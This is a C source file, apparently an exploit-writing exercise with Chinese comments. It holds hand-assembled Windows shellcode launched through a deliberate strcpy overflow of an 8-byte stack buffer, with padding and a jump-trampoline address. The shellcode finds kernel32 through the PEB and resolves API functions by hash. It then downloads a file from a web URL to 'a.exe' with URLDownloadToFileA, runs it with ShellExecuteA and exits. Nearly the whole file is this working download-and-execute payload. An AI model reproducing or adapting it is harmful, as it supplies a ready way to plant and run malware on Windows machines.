#include <windows.h>
#include <stdio.h>

char src[]=
	"\x41\x41\x41\x41"			//填充
	"\x41\x41\x41\x41"			//填充
	"\x41\x41\x41\x41"			//填充
	"\x12\x45\xFA\x7F"			//跳板
	"\x66\x81\xEC\x04\x01"		//sub sp,0104h      ;抬高栈顶
	"\x8B\xEC"					//mov ebp,esp       ;构造新栈
	"\x33\xC0"					//xor eax,eax
	"\xB0\x32"					//mov al,32h        ;字符串"2"
	"\x50"						//push eax        ;压入字符串"2"
	"\x68\x6F\x6C\x65\x33"		//push 33656C6Fh      ;压入字符串"ole3"
	"\x33\xC0"					//xor eax,eax
	"\x66\xB8\x6F\x6E"			//mov ax,6E6Fh      ;"on00"
	"\x50"						//push eax
	"\x68\x75\x72\x6C\x6D"		//push 6D6C7275h      ;"urlm",压入"urlmon"字符串
	"\x33\xC0"					//xor eax,eax
	"\x68\x6C\x33\x32\xFF"		//push 0ff32336Ch     ;字符串"l32"
	"\x68\x73\x68\x65\x6C"		//push 6C656873h     ;字符串"shel"
	"\x33\xC0"					//xor eax,eax
	"\x88\x44\x24\x07"			//mov byte ptr[esp+07h],al;把"l32"后面的ff变成00，截断字符串
	"\xB0\x2F"					//mov al,2Fh
	"\x50"						//push eax
	"\x68\x2E\x63\x6F\x6D"		//push 6D6F632Eh
	"\x68\x61\x69\x64\x75"		//push 75646961h
	"\x68\x77\x77\x2E\x62"		//push 622E7777h
	"\x68\x3A\x2F\x2F\x77"		//push 772F2F3Ah
	"\x68\x68\x74\x74\x70"		//push 70747468h      ;压入字符串"http://www.baidu.com/"
	"\x33\xC0"					//xor eax,eax
	"\xB0\x65"					//mov al,65h
	"\x50"						//push eax        ;压入字符"e"
	"\x68\x61\x2E\x65\x78"		//push 78652E61h      ;压入字符串"a.ex"
	"\x99"						//cdq
	"\x64\x8B\x5A\x30"			//mov ebx,fs:[edx+30h]  ;PEB地址
	"\x8B\x4B\x0C"				//mov ecx,[ebx+0ch]   ;ldr地址
	"\x8B\x49\x1C"				//mov ecx,[ecx+1ch]   ;初始化顺序模块列表地址
	"\x8B\x09"					//mov ecx,[ecx]     ;指向第二个
	"\x8B\x49\x08"				//mov ecx,[ecx+08h]   ;kernel32基址
	"\x51"						//push ecx        ;保存kernel32基址
	"\x68\x32\x74\x91\x0C"		//push 0C917432h     ;压入"LoadLibraryA"的hash值
	"\x51"						//push ecx        ;压入kernel32的基址
	"\x8A\xDA"					//mov bl,dl        ;阶段0
	"\xEB\x79"					//jmp FindFunc      ;查找LoadLibraryA()函数地址
	//MainTemp:
	"\x38\xD3"					//cmp bl,dl        ;判断阶段0,加载ole32,获取CoInitialize函数地址
	"\x74\x14"					//jz MainTemp0
	"\x80\xFB\x01"				//cmp bl,01h        ;判断阶段1,加载urlmon.dll，获取URLDownloadToFileA函数地址
	"\x74\x20"					//jz MainTemp1
	"\x80\xFB\x02"				//cmp bl,02h        ;判断阶段2,下载文件，获取ShellExecuteA函数地址
	"\x74\x30"					//jz MainTemp2
	"\x80\xFB\x03"				//cmp bl,03h        ;判断阶段3，执行文件，获取ExitProcess函数地址
	"\x74\x4A"					//jz MainTemp3
	"\x80\xFB\x04"				//cmp bl,04h        ;判断阶段4，执行退出操作
	"\x74\x5D"					//jz MainTemp4
	//MainTemp0:
	"\x8D\x4D\xF8"				//lea ecx,dword ptr[ebp-08h];获取字符串"ole32"的地址
	"\x50"						//push eax        ;保存LoadLibraryA的函数地址，call调用LoadLibraryA函数结束eax的值会变成函数返回值
	"\x51"						//push ecx        ;压入"ole32"字符串地址
	"\xFF\xD0"					//call eax        ;调用LoadLibraryA()加载ole32.dll
	"\x68\x16\x55\xF4\xF0"		//push 0F0F45516h     ;压入字符串"CoInitialize"的hash值
	"\x50"						//push eax        ;压入ole32.dll的基址
	"\xB3\x01"					//mov bl,01h        ;阶段1
	"\xEB\x50"					//jmp FindFunc      ;查询CoInitialize函数地址
	//MainTemp1:
	"\x99"						//cdq
	"\x52"						//push edx
	"\xFF\xD0"					//call eax		;调用CoInitialize()函数，初始化COM
	"\x8D\x4D\xF0"				//lea ecx,dword ptr[ebp-10h];获取urlmon字符串地址
	"\x51"						//push ecx        ;压入"urlmon"字符串地址
	"\xFF\x55\xC0"				//call dword ptr [ebp-40h]      ;调用LoadLibraryA()加载urlmon.dll
	"\x68\x80\xD6\xAF\x9A"		//push 9AAFD680h     ;压入"URLDownloadToFileA"字符串的hash值
	"\x50"						//push eax        ;压入urlmon.dll的基址
	"\xB3\x02"					//mov bl,02h        ;阶段2
	"\xEB\x3B"					//jmp FindFunc      ;查询URLDownloadToFileA函数地址
	//MainTemp2:
	"\x99"						//cdq
	"\x52"						//push edx        ;0
	"\x52"						//push edx        ;0
	"\x8D\x4D\xC8"				//lea ecx,dword ptr[ebp-38h];计算字符串"a.exe"的地址
	"\x51"						//push ecx
	"\x8D\x4D\xD0"				//lea ecx,dword ptr[ebp-30h];计算字符串"http://www.baidu.com/"的地址
	"\x51"						//push ecx
	"\x52"						//push edx        ;0
	"\xFF\xD0"					//call eax        ;HRESULT URLDownloadToFile(LPUNKNOWN pCaller,LPCTSTR szURL,LPCTSTR szFileName,DWORD dwReserved,LPBINDSTATUSCALLBACK lpfnCB);
	"\x8D\x4D\xE8"				//lea ecx,dword ptr [ebp-18h];获取字符串"shell32"的地址
	"\x51"						//push ecx
	"\xFF\x55\xC0"				//call dword ptr [ebp-40h]      ;调用LoadLibraryA函数
	"\x68\x58\xCB\x3B\x21"		//push 213BCB58h     ;压入字符串"ShellExecuteA"的hash值
	"\x50"						//push eax        ;压入shell32.dll基址
	"\xB3\x03"					//mov bl,03h        ;阶段3
	"\xEB\x1C"					//jmp FindFunc      ;查询ShellExecuteA函数地址
	//MainTemp3:
	"\x99"						//cdq
	"\x52"						//push edx        ;0
	"\x52"						//push edx        ;0
	"\x52"						//push edx        ;0
	"\x8D\x4D\xC8"				//lea ecx,dword ptr [ebp-38h];获取字符串"a.exe"的地址
	"\x51"						//push ecx
	"\x52"						//push edx        ;0
	"\x52"						//push edx        ;0
	"\xFF\xD0"					//call eax        ;调用函数HINSTANCE ShellExecuteA(
								//				  ; HWND   hwnd,         // 父窗口句柄
								//				  ; LPCSTR lpOperation,  // 动作/操作（动词）
								//				  ; LPCSTR lpFile,       // 目标文件、程序、路径或网址
								//				  ; LPCSTR lpParameters, // 命令行参数
								//				  ; LPCSTR lpDirectory,  // 默认工作目录
								//				  ; INT    nShowCmd      // 窗口显示方式
								//				  ;);
	"\x68\x63\x89\xD1\x4F"		//push 4FD18963h     ;压入字符串"ExitProcess"的hash值
	"\xFF\x75\xC4"				//push [ebp-3Ch]      ;压入kernel32基址
	"\xB3\x04"					//mov bl,04h        ;阶段4
	"\xEB\x04"					//jmp FindFunc      ;查询ExitProcess函数地址
	//MainTemp4:
	"\x99"						//cdq
	"\x52"						//push edx        ;0
	"\xFF\xD0"					//call eax        ;调用ExitProcess函数
	//FindFunc:
	"\x55"						//push ebp        ;保存栈底
	"\x8B\xEC"					//mov ebp,esp       ;创建新栈
	"\x53"						//push ebx        ;保存阶段1
	"\x8B\x5D\x04"				//mov ebx,dword ptr [ebp+04h];调用FindFunc之前ecx的值(在哪个dll查询函数)
	"\x8B\x43\x3C"				//mov eax,[ebx+3ch]   ;PE头偏移
	"\x8B\x4C\x03\x78"			//mov ecx,[eax+ebx+78h] ;"eax+ebx+78h"是"DataDirectory[0].VirtualAddress"的地址，取值后是导出表的RVA
	"\x03\xCB"					//add ecx,ebx       ;导出表地址
	"\x8B\x51\x20"				//mov edx,[ecx+20h]   ;函数名索引RVA
	"\x03\xD3"					//add edx,ebx       ;函数名索引地址
	"\x33\xFF"					//xor edi,edi       ;记录函数名下标序号
	//FindFuncLoop:
	"\x47"						//inc edi
	"\x8B\x34\xBA"				//mov esi,[edx+edi*4]   ;对应edi下标的函数名偏移
	"\x03\xF3"					//add esi,ebx       ;函数名地址
	"\x56"						//push esi        ;保存函数名地址
	"\xEB\x27"					//jmp GetHash
	//FindFuncTemp:				//为了GetHash之后能回来
	"\x3B\x45\x08"				//cmp eax,dword ptr[ebp+08h];拿到LoadLibraryA的字符串的哈希值并判断
	"\x75\xF2"					//jnz FindFuncLoop    ;跳转到循环
	"\x8B\x41\x24"				//mov eax,[ecx+24h]   ;从导出表地址找到序号变换索引RVA
	"\x03\xC3"					//add eax,ebx       ;序号变换索引地址
	"\x66\x8B\x3C\x78"			//mov di,[eax+edi*2]    ;edi是变换后的序号
	"\x8B\x41\x1C"				//mov eax,[ecx+1ch]   ;函数地址数组的RVA
	"\x03\xC3"					//add eax,ebx       ;函数地址数组的地址
	"\x8B\x04\xB8"				//mov eax,[eax+edi*4]   ;函数地址的RVA
	"\x03\xC3"					//add eax,ebx       ;函数地址
	"\xEB\x01"					//jmp FindFuncReturn
	"\x90"						//nop
	//FindFuncReturn:
	"\x5B"						//pop ebx         ;还原阶段1
	"\x8B\xE5"					//mov esp,ebp       ;释放FindFunc的栈
	"\x5D"						//pop ebp         ;还原调用FindFunc前的栈底
	"\x83\xC4\x08"				//add esp,08h       ;弹出kernel32基址和LoadLibraryA字符串的hash值
	"\xE9\x40\xFF\xFF\xFF"		//jmp MainTemp      ;回到Main主函数
	//GetHash:
	"\x55"						//push ebp        ;保存调用GetHash前的栈底
	"\x8B\xEC"					//mov ebp,esp       ;创建新栈
	"\x53"						//push ebx        ;保存dll基址'
	"\x51"						//push ecx        ;保存导出表地址
	"\x52"						//push edx        ;保存函数名索引地址
	"\x33\xC0"					//xor eax,eax       ;字符串哈希值结果
	"\x33\xDB"					//xor ebx,ebx       ;临时存储单个字节
	"\x99"						//cdq           ;用于判断是否到字符串结尾
	"\x8B\x4D\x04"				//mov ecx,dword ptr [ebp+04h];函数名地址
	//HashLoop:
	"\x3A\x11"					//cmp dl,byte ptr[ecx]  ;判断是否为字符串结尾
	"\x74\x0C"					//jz GetHashReturn    ;字符串遍历到结尾退出
	"\xC1\xC8\x07"				//ror eax,7       ;循环右移7位
	"\x0F\xBE\x19"				//movsx ebx,byte ptr[ecx] ;取单个字符，扩展成32位
	"\x03\xC3"					//add eax,ebx       ;把字符加到字符串哈希结果中
	"\x41"						//inc ecx         ;移动字符串指针，指向下一个字符
	"\xEB\xF1"					//jmp HashLoop      ;跳转到循环开始
	"\x90"						//nop
	//GetHashReturn:
	"\x5A"						//pop edx         ;恢复函数名索引地址
	"\x59"						//pop ecx         ;恢复导出表地址
	"\x5B"						//pop ebx         ;恢复dll基址
	"\x8B\xE5"					//mov esp,ebp       ;清理GetHash的栈
	"\x5D"						//pop ebp         ;恢复调用GetHash前的栈底
	"\x83\xC4\x04"				//add esp,04h       ;清理调用GetHash压入栈中的参数(函数名地址)
	"\xEB\xB0";					//jmp FindFuncTemp    ;回到FindFunc继续判断目标哈希值是否一致
int MyFunc()
{
	char dest[8]={0};
	strcpy(dest,src);
	return 0;
}
int main()
{
	char buff[256]={0};
	MyFunc();
	return 0;
}


